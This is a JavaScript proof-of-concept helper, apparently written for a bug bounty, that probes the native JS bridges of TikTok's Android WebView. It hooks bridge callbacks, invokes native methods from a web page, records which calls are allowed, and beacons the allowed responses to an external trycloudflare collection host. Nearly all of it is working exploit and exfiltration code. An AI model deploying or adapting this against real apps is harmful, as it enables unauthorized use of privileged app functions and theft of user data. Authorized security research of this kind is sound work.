// z01dberg - TikTok Android WebView JS-bridge origin probe (bug bounty PoC helper)
(function(g){
  var qs = new URLSearchParams(location.search);
  var COLLECT = qs.get('c') || "https://carroll-filters-columnists-gonna.trycloudflare.com";
  g.TT = {
    collect: COLLECT,
    log: [],
    beacon: function(tag, s){
      try{ var i=new Image(); i.src = COLLECT + "/report?tag="+encodeURIComponent(tag)+"&d="+encodeURIComponent(String(s).slice(0,1400))+"&_="+Math.random(); }catch(e){}
    },
    show: function(){
      var el=document.getElementById('out'); if(el) el.textContent = g.TT.log.join("\n");
    },
    put: function(line){ g.TT.log.push(line); g.TT.show(); },
    hook: function(){
      ["ToutiaoJSBridge","BDXBridge","JS2NativeBridge"].forEach(function(i){
        try{ if(g[i]){
          g[i]._handleMessageFromToutiao = function(s){ TT.reply(i,s); };
          g[i]._handleMessageFromApp     = function(s){ TT.reply(i,s); };
        } }catch(e){}
      });
    },
    reply: function(iface, s){
      var m = (typeof s === "string") ? s : JSON.stringify(s);
      var authed = m.indexOf("not authorized") < 0;
      TT.put((authed ? "[ALLOWED] " : "[denied ] ") + iface + " " + m.slice(0,400));
      if (authed) TT.beacon("ALLOWED_"+iface, m);
    },
    call: function(func, params, extra){
      var p = {__msg_type:"call", __callback_id:"cb_"+func+"_"+Math.random().toString(36).slice(2,7),
               func:func, params:params||{}, JSSDK:"1", namespace:"host"};
      if (extra) for (var k in extra) p[k]=extra[k];
      var s = JSON.stringify(p);
      try{ g.ToutiaoJSBridge.invokeMethod(s); }catch(e){ TT.put("ERR TT "+func+" "+e); }
    },
    bridges: function(){
      return ["ToutiaoJSBridge","BDXBridge","JS2NativeBridge","__TTHYBRIDXHR","__globalprops","local_obj","WIReport","WebReport","WJSIReport","iesJsBridgeTransferMonitor"]
        .filter(function(k){ return typeof g[k] !== "undefined"; });
    }
  };
})(window);
